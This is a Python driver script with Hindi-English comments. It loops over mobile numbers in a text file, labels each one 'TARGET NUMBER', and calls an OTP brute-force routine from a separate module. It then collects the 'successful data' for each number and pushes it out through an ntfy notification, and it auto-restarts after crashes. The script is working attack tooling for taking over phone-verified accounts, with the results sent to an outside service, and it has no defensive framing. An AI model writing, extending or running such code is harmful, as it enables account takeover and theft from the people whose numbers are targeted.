import asyncio
import os
import importlib
import utils

async def main():
    # 1. Numbers ki list check karo
    if not os.path.exists("numbers.txt"):
        print("[!] Pehle 'numbers.txt' file banao aur usme mobile numbers (har line pe ek) daalo.")
        return

    with open("numbers.txt", "r") as f:
        phone_numbers = [line.strip() for line in f if line.strip()]

    if not phone_numbers:
        print("[!] 'numbers.txt' file khaali hai.")
        return

    print(f"[*] Total {len(phone_numbers)} numbers mile list me. Process shuru karta hu...\n")

    # 2. Time.py ko as a module import karo
    import Time  # Tumhari existing file (Time.py)
    
    for number in phone_numbers:
        print(f"\n{'='*50}")
        print(f"[*] TARGET NUMBER: {number}")
        print(f"{'='*50}")
        
        # Time.py wale PHONE_NUMBER ko dynamically update karo
        Time.PHONE_NUMBER = number
        
        # Time.py ka main function call karo
        await Time.brute_force_otp()
        
        print(f"\n[*] Number {number} ka process complete. Data check karke notification bhejta hu...")
        
        # 3. Successful data file se nikalo
        success_data = utils.get_successful_data(number)
        
        # 4. Ntfy pe notification bhejo
        message = f"Number: {number}\nData: {success_data}"
        await utils.send_ntfy_notification(message)
        
        # 5. Number ko list se hata do taaki dobara try na ho
        utils.remove_number_from_list(number)
        
        print(f"[*] Number {number} list se hata diya gaya. Agla number shuru kar raha hu...")
        await asyncio.sleep(2) # Thoda break before next number

if __name__ == "__main__":
    import time
    while True:
        try:
            asyncio.run(main())
            break  # Agar main function sahi se khatam ho jaye toh loop tod do
        except Exception as e:
            print(f"\n[-] FATAL ERROR: Script crash ho gaya! Error: {e}")
            print("[*] Auto-restarting in 5 seconds...")
            time.sleep(5)